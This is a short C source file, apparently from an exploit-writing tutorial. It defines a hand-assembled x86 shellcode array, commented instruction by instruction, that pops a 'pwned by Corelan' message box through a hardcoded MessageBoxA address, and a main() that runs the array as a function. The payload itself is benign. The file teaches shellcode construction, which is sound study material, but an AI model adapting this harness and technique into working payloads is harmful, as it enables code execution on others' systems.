// TestExploitTool.c : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

char code[] =

//first put our strings on the stack
"\x68\x6c\x61\x6e\x00"   // push "Corelan" ==> Caption
"\x68\x43\x6f\x72\x65"   //
"\x8b\xdc"               // mov ebx,esp ==> this puts a pointer to the caption into ebx
						 //
"\x68\x61\x6e\x20\x00"   // push "You have been pwned by Corelan" ==> Text
"\x68\x6f\x72\x65\x6c"   //
"\x68\x62\x79\x20\x43"   //
"\x68\x6e\x65\x64\x20"   //
"\x68\x6e\x20\x70\x77"   //
"\x68\x20\x62\x65\x65"   //
"\x68\x68\x61\x76\x65"   //
"\x68\x59\x6f\x75\x20"   //
"\x8b\xcc"               // mov ecx,esp ==> this puts a pointer to the text into ecx

// now put the parameters/pointers onto the stack
// clear out eax and push it to the stack
"\x33\xc0"   //xor eax,eax ==> eax is now 00000000

"\x50"       // push eax ==> 1st parameter is 0
"\x53"		 // push ebx ==> 2nd parameter is caption
"\x51"       // push ecx ==> 3rd parameter is text
"\x50"       // push eax ==> 4th parameter is 0

//stack is now set up with 4 pointers
//but we need to add 8 more bytes to the stack
//to make sure the parameters are read from the right offset

"\x68\x07\x15\x41\x00"       // push 0x00411507 ==> the return address in main fuction
"\xc7\xc6\x30\x88\x64\x77"   // mov esi,0x77648830 ==> the function address to be aclled
"\xff\xe6";                  // jmp esi ==> launch MessageBox

int main(int argc, char **argv)
{
	MessageBoxA(NULL,
		"You have been pwned by Corelan",
		"Corelan",
		MB_OK);
	
	int(*func)();
	func = (int(*)()) code;
	(int)(*func)();
}